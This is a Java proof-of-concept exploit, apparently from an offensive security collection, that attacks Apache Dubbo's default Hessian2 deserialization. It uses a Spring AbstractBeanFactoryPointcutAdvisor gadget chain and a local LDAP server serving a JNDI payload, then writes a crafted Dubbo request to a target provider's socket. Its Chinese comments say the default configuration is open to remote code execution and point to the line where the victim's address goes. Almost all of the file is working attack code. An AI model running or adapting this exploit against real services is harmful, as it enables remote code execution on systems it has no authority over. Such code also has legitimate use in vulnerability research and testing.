package com.threedr3am.bug.dubbo;

import com.caucho.hessian.io.Hessian2Output;
import com.threedr3am.bug.server.LdapServer;
import com.threedr3am.bug.support.NoWriteReplaceSerializerFactory;
import com.threedr3am.bug.utils.SpringUtil;
import java.io.ByteArrayOutputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.util.HashMap;
import java.util.Random;
import org.apache.dubbo.common.io.Bytes;
import org.apache.dubbo.common.serialize.Cleanable;
import org.springframework.beans.factory.BeanFactory;

/**
 * dubbo 默认配置，即hessian2反序列化，都可RCE
 *
 * Spring环境可打，暂时测试Spring-boot打不了（应该是AOP相关类的问题）
 *
 * <dependency>
 *   <groupId>org.springframework</groupId>
 *   <artifactId>spring-aop</artifactId>
 *   <version>${spring.version}</version>
 * </dependency>
 *
 * @author threedr3am
 */
public class SpringAbstractBeanFactoryPointcutAdvisorPoc {

  static {
    //rmi server示例
//    RmiServer.run();

    //ldap server示例
    LdapServer.run();
  }

  public static void main(String[] args) throws Exception {
    BeanFactory bf = SpringUtil.makeJNDITrigger("ldap://127.0.0.1:43658/Calc");
    Object o = SpringUtil.makeBeanFactoryTriggerBFPA("ldap://127.0.0.1:43658/Calc", bf);

    ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();

    // header.
    byte[] header = new byte[16];
    // set magic number.
    Bytes.short2bytes((short) 0xdabb, header);
    // set request and serialization flag.
    header[2] = (byte) ((byte) 0x80 | 2);

    // set request id.
    Bytes.long2bytes(new Random().nextInt(100000000), header, 4);

    ByteArrayOutputStream hessian2ByteArrayOutputStream = new ByteArrayOutputStream();
    ByteArrayOutputStream hessian2ByteArrayOutputStream2 = new ByteArrayOutputStream();
    ByteArrayOutputStream hessian2ByteArrayOutputStream3 = new ByteArrayOutputStream();
    Hessian2Output out = new Hessian2Output(hessian2ByteArrayOutputStream);
    Hessian2Output out2 = new Hessian2Output(hessian2ByteArrayOutputStream2);
    Hessian2Output out3 = new Hessian2Output(hessian2ByteArrayOutputStream3);
    NoWriteReplaceSerializerFactory sf = new NoWriteReplaceSerializerFactory();
    sf.setAllowNonSerializable(true);
    out2.setSerializerFactory(sf);

    //todo 经测试，以下4个随意填
    //注册中心获取到的service全限定名、版本号、方法名
    out.writeString("2.0.2");
    out.writeString("com.threedr3am.learn.server.boot.DemoService");
    out.writeString("1.0");
    out.writeString("hello");
    //todo 方法描述不需要修改，因为此处需要指定map的payload去触发
    out.writeString("Ljava/util/Map;");
    out.flushBuffer();
    if (out instanceof Cleanable) {
      ((Cleanable) out).cleanup();
    }

    out2.writeObject(o);
    out2.flushBuffer();
    if (out2 instanceof Cleanable) {
      ((Cleanable) out2).cleanup();
    }

    out3.writeObject(new HashMap());
    out3.flushBuffer();
    if (out3 instanceof Cleanable) {
      ((Cleanable) out3).cleanup();
    }

    Bytes.int2bytes(hessian2ByteArrayOutputStream.size() + hessian2ByteArrayOutputStream2.size()
        + hessian2ByteArrayOutputStream3.size(), header, 12);
    byteArrayOutputStream.write(header);
    byteArrayOutputStream.write(hessian2ByteArrayOutputStream.toByteArray());
    byteArrayOutputStream.write(hessian2ByteArrayOutputStream2.toByteArray());
    byteArrayOutputStream.write(hessian2ByteArrayOutputStream3.toByteArray());

    byte[] bytes = byteArrayOutputStream.toByteArray();

    //todo 此处填写被攻击的dubbo服务提供者地址和端口
    Socket socket = new Socket("127.0.0.1", 20880);
    OutputStream outputStream = socket.getOutputStream();
    outputStream.write(bytes);
    outputStream.flush();
    outputStream.close();
  }
}
